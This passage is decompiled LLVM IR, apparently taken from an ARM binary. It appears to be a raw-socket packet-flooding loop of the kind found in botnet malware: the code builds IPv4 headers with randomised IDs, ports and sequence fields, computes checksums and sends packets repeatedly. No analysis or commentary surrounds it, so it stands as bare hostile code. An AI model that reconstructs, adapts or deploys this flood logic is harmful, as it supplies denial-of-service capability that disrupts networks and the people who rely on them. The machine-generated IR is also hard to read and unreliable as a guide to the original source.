  %v6_aae8 = icmp slt i32 %v1_aad8, %v1_aadc
  br i1 %v6_aae8, label %dec_label_pc_aaec, label %dec_label_pc_aba4

dec_label_pc_aaec:                                ; preds = %bb, %dec_label_pc_a9a4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_aaf8 = call i32 @function_1320c(i32 1510, i32 4)
  store i32 %v2_aaf8, i32* %r0.global-to-local, align 4
  store i32 %v2_a800, i32* %r2.global-to-local, align 4
  %v3_ab00 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab00, i32* %r3.global-to-local, align 4
  %v2_ab04 = load i32, i32* @r4, align 4
  %v5_ab04 = mul i32 %v2_ab04, 4
  %v6_ab04 = add i32 %v5_ab04, %v2_a800
  %v7_ab04 = inttoptr i32 %v6_ab04 to i32*
  store i32 %v2_aaf8, i32* %v7_ab04, align 4
  %v0_ab08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ab08 = load i32, i32* %r3.global-to-local, align 4
  %v4_ab08 = mul i32 %v1_ab08, 4
  %v5_ab08 = add i32 %v4_ab08, %v0_ab08
  %v6_ab08 = inttoptr i32 %v5_ab08 to i32*
  %v7_ab08 = load i32, i32* %v6_ab08, align 4
  store i32 %v7_ab08, i32* %r4.global-to-local, align 4
  %v1_ab0c = inttoptr i32 %v7_ab08 to i8*
  %v2_ab0c = load i8, i8* %v1_ab0c, align 1
  %tmp60 = urem i8 %v2_ab0c, 16
  %v1_ab10 = zext i8 %tmp60 to i32
  %v1_ab14 = or i32 %v1_ab10, 64
  store i32 %v1_ab14, i32* %r2.global-to-local, align 4
  %v1_ab18 = trunc i32 %v1_ab14 to i8
  store i8 %v1_ab18, i8* %v1_ab0c, align 1
  %v0_ab1c = load i32, i32* %r4.global-to-local, align 4
  %v1_ab1c = inttoptr i32 %v0_ab1c to i8*
  %v2_ab1c = load i8, i8* %v1_ab1c, align 1
  %v1_ab20 = and i8 %v2_ab1c, -16
  %v1_ab24 = or i8 %v1_ab20, 5
  store i8 %v1_ab24, i8* %v1_ab1c, align 1
  store i32 %v4_ab2c, i32* %r3.global-to-local, align 4
  %v2_ab30 = load i32, i32* %r4.global-to-local, align 4
  %v3_ab30 = add i32 %v2_ab30, 1
  %v4_ab30 = inttoptr i32 %v3_ab30 to i8*
  store i8 %v5_a838, i8* %v4_ab30, align 1
  store i32 %v3_a9c0, i32* %r0.global-to-local, align 4
  %v1_ab38 = call i32 @function_1484c(i32 %v3_a9c0)
  %v2_ab38 = trunc i32 %v1_ab38 to i16
  %v3_ab3c = load i32, i32* %r4.global-to-local, align 4
  %v4_ab3c = add i32 %v3_ab3c, 2
  %v5_ab3c = inttoptr i32 %v4_ab3c to i16*
  store i16 %v2_ab38, i16* %v5_ab3c, align 2
  %v0_ab40 = load i32, i32* @fp, align 4
  store i32 %v0_ab40, i32* %r0.global-to-local, align 4
  %v1_ab44 = call i32 @function_1484c(i32 %v0_ab40)
  %v2_ab44 = trunc i32 %v1_ab44 to i16
  store i32 %v1_ab44, i32* %r0.global-to-local, align 4
  store i32 %v1_a880, i32* %r1.global-to-local, align 4
  store i32 %v4_ab4c, i32* %r2.global-to-local, align 4
  store i1 %v2_ab50, i1* %cpsr_z.global-to-local, align 1
  %v3_ab54 = load i32, i32* %r4.global-to-local, align 4
  %v4_ab54 = add i32 %v3_ab54, 4
  %v5_ab54 = inttoptr i32 %v4_ab54 to i16*
  store i16 %v2_ab44, i16* %v5_ab54, align 2
  %v0_ab58 = load i32, i32* %r2.global-to-local, align 4
  %v1_ab58 = trunc i32 %v0_ab58 to i8
  %v2_ab58 = load i32, i32* %r4.global-to-local, align 4
  %v3_ab58 = add i32 %v2_ab58, 8
  %v4_ab58 = inttoptr i32 %v3_ab58 to i8*
  store i8 %v1_ab58, i8* %v4_ab58, align 1
  %v0_ab5c = load i32, i32* %r4.global-to-local, align 4
  %v1_ab5c = add i32 %v0_ab5c, 38
  store i32 %v1_ab5c, i32* @r5, align 4
  %v1_ab60 = add i32 %v0_ab5c, 58
  store i32 %v1_ab60, i32* @r6, align 4
  %v1_ab64 = add i32 %v0_ab5c, 24
  store i32 %v1_ab64, i32* @r7, align 4
  %v1_ab68 = add i32 %v0_ab5c, 20
  store i32 %v1_ab68, i32* @r8, align 4
  %v0_ab6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ab6c, label %dec_label_pc_a9e8, label %dec_label_pc_ab70

dec_label_pc_ab70:                                ; preds = %dec_label_pc_aaec
  store i32 16384, i32* %r0.global-to-local, align 4
  %v1_ab74 = call i32 @function_1484c(i32 16384)
  %v2_ab74 = trunc i32 %v1_ab74 to i16
  store i32 %v1_ab74, i32* %r0.global-to-local, align 4
  %v3_ab78 = load i32, i32* %r4.global-to-local, align 4
  %v4_ab78 = add i32 %v3_ab78, 6
  %v5_ab78 = inttoptr i32 %v4_ab78 to i16*
  store i16 %v2_ab74, i16* %v5_ab78, align 2
  %v2_a9ec.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a9e8

dec_label_pc_ab80:                                ; preds = %dec_label_pc_a9e8
  store i32 16384, i32* %r0.global-to-local, align 4
  %v1_ab84 = call i32 @function_1484c(i32 16384)
  %v2_ab84 = trunc i32 %v1_ab84 to i16
  store i32 %v1_ab84, i32* %r0.global-to-local, align 4
  %v3_ab88 = load i32, i32* @r5, align 4
  %v4_ab88 = add i32 %v3_ab88, 6
  %v5_ab88 = inttoptr i32 %v4_ab88 to i16*
  store i16 %v2_ab84, i16* %v5_ab88, align 2
  br label %dec_label_pc_aa88

dec_label_pc_ab90:                                ; preds = %dec_label_pc_a944
  store i32 %v3_a934, i32* @r0, align 4
  %v1_ab94 = call i32 @function_15b20(i32 %v3_a934)
  store i32 %v1_ab94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ab98

dec_label_pc_ab98:                                ; preds = %dec_label_pc_a7e4, %dec_label_pc_ab90
  %v1_aba0 = phi i32 [ %v3_a934, %dec_label_pc_a7e4 ], [ %v1_ab94, %dec_label_pc_ab90 ]
  store i32 %v3_a7e4, i32* %r4.global-to-local, align 4
  store i32 %v24_a7e4, i32* %fp.global-to-local, align 4
  ret i32 %v1_aba0

dec_label_pc_aba4:                                ; preds = %bb
  %v1_abac = add i32 %v5_a8cc, 8
  store i32 %v1_abac, i32* %r3.global-to-local, align 4
  %v1_abb0 = add i32 %v5_a8cc, 66
  store i32 %v1_abb0, i32* %r1.global-to-local, align 4
  %v0_abc0.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_abbc.preheader

dec_label_pc_abbc.preheader:                      ; preds = %dec_label_pc_aba4, %dec_label_pc_ae20
  %v0_abc0.pre = phi i32 [ %v0_abc0.pre.pre, %dec_label_pc_aba4 ], [ 0, %dec_label_pc_ae20 ]
  %stack_var_-120.0.ph = phi i32 [ %v1_abb0, %dec_label_pc_aba4 ], [ %v1_ae2c, %dec_label_pc_ae20 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_abac, %dec_label_pc_aba4 ], [ %v1_ae28, %dec_label_pc_ae20 ]
  %v3_ad88 = icmp eq i32 %v5_a920, -1
  %v8_ad88 = icmp eq i32 %v5_a920, -1
  %v2_adf0 = icmp eq i32 %v1_a984, 0
  %v2_ac58 = ptrtoint i32* %stack_var_-48 to i32
  %v2_ac70 = ptrtoint i32* %stack_var_-52 to i32
  %v2_ac80 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ac90 = ptrtoint i32* %stack_var_-54 to i32
  %v2_aca0 = icmp eq i32 %v1_a8ec, 0
  br label %dec_label_pc_abbc

dec_label_pc_abbc:                                ; preds = %dec_label_pc_abbc, %dec_label_pc_aca8, %dec_label_pc_abbc.preheader
  %v0_abc0 = phi i32 [ %v0_abc0.pre, %dec_label_pc_abbc.preheader ], [ 0, %dec_label_pc_abbc ], [ %v1_ad48, %dec_label_pc_aca8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_abc0 = icmp eq i32 %v0_abc0, 0
  store i1 %v2_abc0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_abc0, label %dec_label_pc_abbc, label %dec_label_pc_abcc

dec_label_pc_abcc:                                ; preds = %dec_label_pc_abbc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_abd0

dec_label_pc_abd0:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_abcc
  %v1_abe4 = phi i32 [ %v1_ad44, %dec_label_pc_aca8 ], [ 0, %dec_label_pc_abcc ]
  %v5_abd4 = mul i32 %v1_abe4, 24
  %v1_abd8 = load i32, i32* @sb, align 4
  %v2_abd8 = add i32 %v1_abd8, %v5_abd4
  store i32 %v2_abd8, i32* %r3.global-to-local, align 4
  store i32 %v2_a800, i32* %r1.global-to-local, align 4
  %v1_abe0 = add i32 %v2_abd8, 20
  %v2_abe0 = inttoptr i32 %v1_abe0 to i8*
  %v3_abe0 = load i8, i8* %v2_abe0, align 1
  %v4_abe0 = zext i8 %v3_abe0 to i32
  store i32 %v4_abe0, i32* %r2.global-to-local, align 4
  %v4_abe4 = mul i32 %v1_abe4, 4
  %v5_abe4 = add i32 %v4_abe4, %v2_a800
  %v6_abe4 = inttoptr i32 %v5_abe4 to i32*
  %v7_abe4 = load i32, i32* %v6_abe4, align 4
  store i32 %v7_abe4, i32* @r5, align 4
  %v7_abe8 = icmp eq i8 %v3_abe0, 31
  store i1 %v7_abe8, i1* %cpsr_z.global-to-local, align 1
  %v1_abec = add i32 %v7_abe4, 24
  store i32 %v1_abec, i32* @r7, align 4
  %v1_abf0 = add i32 %v7_abe4, 38
  store i32 %v1_abf0, i32* @r6, align 4
  %v1_abf4 = add i32 %v7_abe4, 58
  store i32 %v1_abf4, i32* @r8, align 4
  %tmp61 = icmp ult i8 %v3_abe0, 32
  br i1 %tmp61, label %dec_label_pc_ad58, label %dec_label_pc_abfc

dec_label_pc_abfc:                                ; preds = %dec_label_pc_abd0
  store i32 %v5_a920, i32* %r2.global-to-local, align 4
  store i1 %v8_ad88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ad88, label %dec_label_pc_ad94, label %dec_label_pc_ac08

dec_label_pc_ac08:                                ; preds = %dec_label_pc_ad58, %dec_label_pc_abfc
  store i32 65535, i32* @r4, align 4
  %v0_ac10 = load i32, i32* @fp, align 4
  %v9_ac10 = icmp eq i32 %v0_ac10, 65535
  store i1 %v9_ac10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac10, label %dec_label_pc_adac, label %dec_label_pc_ac18

dec_label_pc_ac18:                                ; preds = %dec_label_pc_ad94.dec_label_pc_ac18_crit_edge, %dec_label_pc_ac08
  %v1_ac1c = phi i32 [ %v1_ac1c.pre, %dec_label_pc_ad94.dec_label_pc_ac18_crit_edge ], [ 65535, %dec_label_pc_ac08 ]
  store i32 %v3_a97c, i32* %r3.global-to-local, align 4
  %v9_ac1c = icmp eq i32 %v3_a97c, %v1_ac1c
  store i1 %v9_ac1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac1c, label %dec_label_pc_add4, label %dec_label_pc_ac24

dec_label_pc_ac24:                                ; preds = %dec_label_pc_adac, %dec_label_pc_ac18
  %v1_ac28 = phi i32 [ %v1_adcc, %dec_label_pc_adac ], [ %v1_ac1c, %dec_label_pc_ac18 ]
  store i32 %v3_a980, i32* %r1.global-to-local, align 4
  %v9_ac28 = icmp eq i32 %v3_a980, %v1_ac28
  store i1 %v9_ac28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac28, label %dec_label_pc_ade8, label %dec_label_pc_ac30

dec_label_pc_ac30:                                ; preds = %dec_label_pc_add4, %dec_label_pc_ac24
  store i32 %v1_a984, i32* %r2.global-to-local, align 4
  store i1 %v2_adf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_adf0, label %dec_label_pc_ae04, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_ac30
  %v1_ac38 = load i32, i32* @r5, align 4
  %v2_ac38 = add i32 %v1_ac38, 16
  %v3_ac38 = inttoptr i32 %v2_ac38 to i32*
  %v4_ac38 = load i32, i32* %v3_ac38, align 4
  store i32 %v4_ac38, i32* %r3.global-to-local, align 4
  %v2_ac3c = load i32, i32* @r6, align 4
  %v3_ac3c = add i32 %v2_ac3c, 16
  %v4_ac3c = inttoptr i32 %v3_ac3c to i32*
  store i32 %v4_ac38, i32* %v4_ac3c, align 4
  br label %dec_label_pc_ac44

dec_label_pc_ac44:                                ; preds = %bb58, %.thread4, %dec_label_pc_ae04
  %v0_ac44 = call i32 @function_f570()
  store i32 %v0_ac44, i32* %r0.global-to-local, align 4
  store i32 %v0_ac44, i32* %stack_var_-48, align 4
  %v0_ac4c = call i32 @function_f570()
  store i32 %v0_ac4c, i32* %r0.global-to-local, align 4
  store i32 %v0_ac4c, i32* %stack_var_-52, align 4
  %v0_ac54 = call i32 @function_f570()
  store i32 %v2_ac58, i32* %r1.global-to-local, align 4
  store i32 %v0_ac54, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_ac64 = load i32, i32* @r7, align 4
  store i32 %v0_ac64, i32* %r0.global-to-local, align 4
  %v3_ac68 = call i32 @function_12394(i32 %v0_ac64, i32 %v2_ac58, i32 4)
  %v0_ac6c = load i32, i32* @r7, align 4
  %v1_ac6c = add i32 %v0_ac6c, 6
  store i32 %v1_ac6c, i32* %r0.global-to-local, align 4
  store i32 %v2_ac70, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_ac78 = call i32 @function_12394(i32 %v1_ac6c, i32 %v2_ac70, i32 4)
  %v0_ac7c = load i32, i32* @r7, align 4
  %v1_ac7c = add i32 %v0_ac7c, 4
  store i32 %v1_ac7c, i32* %r0.global-to-local, align 4
  store i32 %v2_ac80, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ac88 = call i32 @function_12394(i32 %v1_ac7c, i32 %v2_ac80, i32 2)
  %v0_ac8c = load i32, i32* @r7, align 4
  %v1_ac8c = add i32 %v0_ac8c, 10
  store i32 %v1_ac8c, i32* %r0.global-to-local, align 4
  store i32 %v2_ac90, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ac98 = call i32 @function_12394(i32 %v1_ac8c, i32 %v2_ac90, i32 2)
  store i32 %v3_ac98, i32* %r0.global-to-local, align 4
  store i32 %v1_a8ec, i32* %r3.global-to-local, align 4
  store i1 %v2_aca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aca0, label %dec_label_pc_aca8, label %dec_label_pc_ae10

dec_label_pc_aca8:                                ; preds = %dec_label_pc_ac44, %dec_label_pc_ae10
  %v2_acac = load i32, i32* @r5, align 4
  %v3_acac = add i32 %v2_acac, 10
  %v4_acac = inttoptr i32 %v3_acac to i16*
  store i16 0, i16* %v4_acac, align 2
  %v0_acb0 = load i32, i32* @r5, align 4
  store i32 %v0_acb0, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_acb8 = call i32 @function_dadc(i32 %v0_acb0, i32 20)
  %v3_acb8 = trunc i32 %v2_acb8 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_acc0 = load i32, i32* @r5, align 4
  %v4_acc0 = add i32 %v3_acc0, 10
  %v5_acc0 = inttoptr i32 %v4_acc0 to i16*
  store i16 %v3_acb8, i16* %v5_acc0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_acc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_acc8 = trunc i32 %v0_acc8 to i16
  %v2_acc8 = load i32, i32* @r6, align 4
  %v3_acc8 = add i32 %v2_acc8, 10
  %v4_acc8 = inttoptr i32 %v3_acc8 to i16*
  store i16 %v1_acc8, i16* %v4_acc8, align 2
  %v0_accc = load i32, i32* @r6, align 4
  store i32 %v0_accc, i32* @r0, align 4
  %v2_acd0 = call i32 @function_dadc(i32 %v0_accc, i32 20)
  %v3_acd0 = trunc i32 %v2_acd0 to i16
  store i32 %v2_acd0, i32* %r0.global-to-local, align 4
  %v3_acd4 = load i32, i32* @r6, align 4
  %v4_acd4 = add i32 %v3_acd4, 10
  %v5_acd4 = inttoptr i32 %v4_acd4 to i16*
  store i16 %v3_acd0, i16* %v5_acd4, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_acdc = load i32, i32* @r8, align 4
  %v3_acdc = add i32 %v2_acdc, 6
  %v4_acdc = inttoptr i32 %v3_acdc to i16*
  store i16 0, i16* %v4_acdc, align 2
  %v0_ace0 = load i32, i32* @r8, align 4
  store i32 %v0_ace0, i32* @r1, align 4
  %v1_ace4 = add i32 %v0_ace0, 4
  %v2_ace4 = inttoptr i32 %v1_ace4 to i16*
  %v3_ace4 = load i16, i16* %v2_ace4, align 2
  %v4_ace4 = zext i16 %v3_ace4 to i32
  store i32 %v4_ace4, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v0_acec = load i32, i32* @r6, align 4
  store i32 %v0_acec, i32* %r0.global-to-local, align 4
  %v4_acf0 = call i32 @function_db2c(i32 %v0_acec, i32 %v0_ace0, i32 %v4_ace4, i32 %stack_var_-124.0.ph)
  %v5_acf0 = trunc i32 %v4_acf0 to i16
  store i32 %v4_acf0, i32* %r0.global-to-local, align 4
  %v3_acf4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_acf4, i32* %r2.global-to-local, align 4
  %v3_acf8 = mul i32 %v3_acf4, 32
  store i32 %v3_acf8, i32* %r3.global-to-local, align 4
  %v0_acfc = load i32, i32* @r5, align 4
  %v1_acfc = add i32 %v0_acfc, 16
  %v2_acfc = inttoptr i32 %v1_acfc to i32*
  %v3_acfc = load i32, i32* %v2_acfc, align 4
  %v5_ad00 = mul i32 %v3_acf4, 24
  store i32 %v5_ad00, i32* %r3.global-to-local, align 4
  %v1_ad04 = load i32, i32* @sb, align 4
  %v2_ad04 = add i32 %v1_ad04, %v5_ad00
  store i32 %v2_ad04, i32* @lr, align 4
  %v2_ad08 = add i32 %v2_ad04, 4
  %v3_ad08 = inttoptr i32 %v2_ad08 to i32*
  store i32 %v3_acfc, i32* %v3_ad08, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_ad14 = load i32, i32* @r8, align 4
  %v4_ad14 = add i32 %v3_ad14, 6
  %v5_ad14 = inttoptr i32 %v4_ad14 to i16*
  store i16 %v5_acf0, i16* %v5_ad14, align 2
  %v0_ad1c = load i32, i32* %r1.global-to-local, align 4
  %v1_ad1c = trunc i32 %v0_ad1c to i16
  %v2_ad1c = load i32, i32* %r3.global-to-local, align 4
  %v3_ad1c = load i32, i32* @sb, align 4
  %v4_ad1c = add i32 %v3_ad1c, %v2_ad1c
  %v5_ad1c = inttoptr i32 %v4_ad1c to i16*
  store i16 %v1_ad1c, i16* %v5_ad1c, align 2
  %v0_ad20 = load i32, i32* %r2.global-to-local, align 4
  %v1_ad20 = trunc i32 %v0_ad20 to i16
  %v2_ad20 = load i32, i32* @lr, align 4
  %v3_ad20 = add i32 %v2_ad20, 2
  %v4_ad20 = inttoptr i32 %v3_ad20 to i16*
  store i16 %v1_ad20, i16* %v4_ad20, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ad28 = load i32, i32* @r5, align 4
  store i32 %v0_ad28, i32* @r1, align 4
  store i32 %v3_a934, i32* @r0, align 4
  store i32 %stack_var_-120.0.ph, i32* @r2, align 4
  %v0_ad3c = call i32 @function_14a98()
  %v3_ad40 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ad40, i32* %r3.global-to-local, align 4
  %v1_ad44 = add i32 %v3_ad40, 1
  store i32 %v1_ad44, i32* %r0.global-to-local, align 4
  %v1_ad48 = load i32, i32* @sl, align 4
  %v9_ad48 = icmp eq i32 %v1_ad44, %v1_ad48
  store i1 %v9_ad48, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ad44, i32* %stack_var_-44, align 4
  %v6_ad50 = icmp slt i32 %v1_ad44, %v1_ad48
  br i1 %v6_ad50, label %dec_label_pc_abd0, label %dec_label_pc_abbc

dec_label_pc_ad58:                                ; preds = %dec_label_pc_abd0
  %v1_ad58 = add i32 %v2_abd8, 16
  %v2_ad58 = inttoptr i32 %v1_ad58 to i32*
  %v3_ad58 = load i32, i32* %v2_ad58, align 4
  store i32 %v3_ad58, i32* %r0.global-to-local, align 4
  %v1_ad5c = call i32 @function_149d0(i32 %v3_ad58)
  store i32 %v1_ad5c, i32* %r0.global-to-local, align 4
  store i32 %v1_ad5c, i32* %r4.global-to-local, align 4
  %v0_ad64 = call i32 @function_f570()
  store i32 %v0_ad64, i32* %r0.global-to-local, align 4
  %v3_ad68 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ad68, i32* %r2.global-to-local, align 4
  %v5_ad70 = mul i32 %v3_ad68, 24
  %v1_ad74 = load i32, i32* @sb, align 4
  %v2_ad74 = add i32 %v1_ad74, %v5_ad70
  store i32 %v2_ad74, i32* %r3.global-to-local, align 4
  %v1_ad78 = add i32 %v2_ad74, 20
  %v2_ad78 = inttoptr i32 %v1_ad78 to i8*
  %v3_ad78 = load i8, i8* %v2_ad78, align 1
  %v4_ad78 = zext i8 %v3_ad78 to i32
  store i32 %v4_ad78, i32* %r2.global-to-local, align 4
  %v0_ad7c = load i32, i32* %r4.global-to-local, align 4
  %v7_ad7c = lshr i32 %v0_ad64, %v4_ad78
  %v8_ad7c = add i32 %v7_ad7c, %v0_ad7c
  store i32 %v8_ad7c, i32* %r0.global-to-local, align 4
  %v1_ad80 = call i32 @function_14828(i32 %v8_ad7c)
  store i32 %v1_ad80, i32* %r0.global-to-local, align 4
  store i32 %v5_a920, i32* %r2.global-to-local, align 4
  store i1 %v8_ad88, i1* %cpsr_z.global-to-local, align 1
  %v1_ad8c = load i32, i32* @r5, align 4
  %v2_ad8c = add i32 %v1_ad8c, 16
  %v3_ad8c = inttoptr i32 %v2_ad8c to i32*
  store i32 %v1_ad80, i32* %v3_ad8c, align 4
  br i1 %v3_ad88, label %dec_label_pc_ad94, label %dec_label_pc_ac08

dec_label_pc_ad94:                                ; preds = %dec_label_pc_ad58, %dec_label_pc_abfc
  %v0_ad94 = call i32 @function_f570()
  store i32 %v0_ad94, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v0_ada0 = load i32, i32* @fp, align 4
  %v9_ada0 = icmp eq i32 %v0_ada0, 65535
  store i1 %v9_ada0, i1* %cpsr_z.global-to-local, align 1
  %v1_ada4 = load i32, i32* @r5, align 4
  %v2_ada4 = add i32 %v1_ada4, 12
  %v3_ada4 = inttoptr i32 %v2_ada4 to i32*
  store i32 %v0_ad94, i32* %v3_ada4, align 4
  br i1 %v9_ada0, label %dec_label_pc_adac, label %dec_label_pc_ad94.dec_label_pc_ac18_crit_edge

dec_label_pc_ad94.dec_label_pc_ac18_crit_edge:    ; preds = %dec_label_pc_ad94
  %v1_ac1c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ac18

dec_label_pc_adac:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_ac08
  %v0_adac = call i32 @function_f570()
  %v3_adb4 = urem i32 %v0_adac, 65536
  store i32 %v3_adb4, i32* %r0.global-to-local, align 4
  %v1_adbc = sub nsw i32 999, %v3_adb4
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v1_adc0 = trunc i32 %v0_adac to i16
  %v2_adc0 = load i32, i32* @r5, align 4
  %v3_adc0 = add i32 %v2_adc0, 4
  %v4_adc0 = inttoptr i32 %v3_adc0 to i16*
  store i16 %v1_adc0, i16* %v4_adc0, align 2
  %v0_adc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_adc4 = trunc i32 %v0_adc4 to i16
  %v2_adc4 = load i32, i32* @r6, align 4
  %v3_adc4 = add i32 %v2_adc4, 4
  %v4_adc4 = inttoptr i32 %v3_adc4 to i16*
  store i16 %v1_adc4, i16* %v4_adc4, align 2
  store i32 %v3_a97c, i32* %r3.global-to-local, align 4
  %v1_adcc = load i32, i32* @r4, align 4
  %v9_adcc = icmp eq i32 %v3_a97c, %v1_adcc
  store i1 %v9_adcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_adcc, label %dec_label_pc_add4, label %dec_label_pc_ac24

dec_label_pc_add4:                                ; preds = %dec_label_pc_adac, %dec_label_pc_ac18
  %v0_add4 = call i32 @function_f570()
  %v1_add4 = trunc i32 %v0_add4 to i16
  store i32 %v0_add4, i32* %r0.global-to-local, align 4
  store i32 %v3_a980, i32* %r1.global-to-local, align 4
  %v1_addc = load i32, i32* @r4, align 4
  %v9_addc = icmp eq i32 %v3_a980, %v1_addc
  store i1 %v9_addc, i1* %cpsr_z.global-to-local, align 1
  %v3_ade0 = load i32, i32* @r5, align 4
  %v4_ade0 = add i32 %v3_ade0, 58
  %v5_ade0 = inttoptr i32 %v4_ade0 to i16*
  store i16 %v1_add4, i16* %v5_ade0, align 2
  br i1 %v9_addc, label %dec_label_pc_ade8, label %dec_label_pc_ac30

dec_label_pc_ade8:                                ; preds = %dec_label_pc_add4, %dec_label_pc_ac24
  %v0_ade8 = call i32 @function_f570()
  %v1_ade8 = trunc i32 %v0_ade8 to i16
  store i32 %v0_ade8, i32* %r0.global-to-local, align 4
  store i32 %v1_a984, i32* %r2.global-to-local, align 4
  store i1 %v2_adf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_adf0, label %.thread18, label %bb58

.thread18:                                        ; preds = %dec_label_pc_ade8
  %v3_adf819 = load i32, i32* @r8, align 4
  %v4_adf820 = add i32 %v3_adf819, 2
  %v5_adf821 = inttoptr i32 %v4_adf820 to i16*
  store i16 %v1_ade8, i16* %v5_adf821, align 2
  br label %dec_label_pc_ae04

bb58:                                             ; preds = %dec_label_pc_ade8
  %v1_adf4 = load i32, i32* @r5, align 4
  %v2_adf4 = add i32 %v1_adf4, 16
  %v3_adf4 = inttoptr i32 %v2_adf4 to i32*
  %v4_adf4 = load i32, i32* %v3_adf4, align 4
  store i32 %v4_adf4, i32* %r3.global-to-local, align 4
  %v3_adf8 = load i32, i32* @r8, align 4
  %v4_adf8 = add i32 %v3_adf8, 2
  %v5_adf8 = inttoptr i32 %v4_adf8 to i16*
  store i16 %v1_ade8, i16* %v5_adf8, align 2
  %v1_adfc = load i32, i32* %r3.global-to-local, align 4
  %v2_adfc = load i32, i32* @r6, align 4
  %v3_adfc = add i32 %v2_adfc, 16
  %v4_adfc = inttoptr i32 %v3_adfc to i32*
  store i32 %v1_adfc, i32* %v4_adfc, align 4
  br label %dec_label_pc_ac44

dec_label_pc_ae04:                                ; preds = %.thread18, %dec_label_pc_ac30
  %v0_ae04 = call i32 @function_f570()
  store i32 %v0_ae04, i32* %r0.global-to-local, align 4
  %v1_ae08 = load i32, i32* @r6, align 4
  %v2_ae08 = add i32 %v1_ae08, 16
  %v3_ae08 = inttoptr i32 %v2_ae08 to i32*
  store i32 %v0_ae04, i32* %v3_ae08, align 4
  br label %dec_label_pc_ac44

dec_label_pc_ae10:                                ; preds = %dec_label_pc_ac44
  %v0_ae10 = load i32, i32* @r8, align 4
  %v1_ae10 = add i32 %v0_ae10, 8
  store i32 %v1_ae10, i32* %r0.global-to-local, align 4
  store i32 %v5_a8cc, i32* %r1.global-to-local, align 4
  %v2_ae18 = inttoptr i32 %v1_ae10 to i16*
  %v3_ae18 = call i32 @function_f770(i16* %v2_ae18, i32 %v5_a8cc)
  store i32 %v3_ae18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aca8

dec_label_pc_ae20:                                ; preds = %dec_label_pc_a96c
  %v1_ae28 = add i32 %v5_a8cc, 8
  store i32 %v1_ae28, i32* %r2.global-to-local, align 4
  %v1_ae2c = add i32 %v5_a8cc, 66
  store i32 %v1_ae2c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_abbc.preheader

; uselistorder directives
  uselistorder i32 %v1_ae2c, { 1, 0 }
  uselistorder i32 %v1_ae28, { 1, 0 }
  uselistorder i16 %v1_ade8, { 1, 0 }
  uselistorder i32 %v0_ade8, { 1, 0 }
  uselistorder i32 %v0_add4, { 1, 0 }
  uselistorder i32 %v1_adcc, { 1, 0 }
  uselistorder i32 %v3_adb4, { 1, 0 }
  uselistorder i32 %v0_adac, { 1, 0 }
  uselistorder i32 %v1_ad48, { 1, 2, 0 }
  uselistorder i32 %v1_ad44, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_acf4, { 1, 0, 2 }
  uselistorder i32 %v4_acf0, { 1, 0 }
  uselistorder i32 %v2_acd0, { 1, 0 }
  uselistorder i32 %v7_abe4, { 2, 1, 0, 3 }
  uselistorder i1 %v2_adf0, { 2, 3, 1, 0 }
  uselistorder i32 %v1_ab84, { 1, 0 }
  uselistorder i32 %v1_ab74, { 1, 0 }
  uselistorder i32 %v0_ab5c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_ab44, { 1, 0 }
  uselistorder i32 %v1_aad0, { 1, 0 }
  uselistorder i32 %v0_aa90, { 1, 0, 2 }
  uselistorder i32 %v1_aa6c, { 1, 0 }
  uselistorder i32 %v4_aa28, { 1, 0 }
  uselistorder i32 %v1_aa24, { 0, 2, 1 }
  uselistorder i32 %v4_ab4c, { 1, 0 }
  uselistorder i1 %v2_ab50, { 1, 0 }
  uselistorder i32 %v4_ab2c, { 1, 0 }
  uselistorder i32 %v3_a9cc, { 2, 1, 0 }
  uselistorder i32 %v3_a9c4, { 2, 1, 0 }
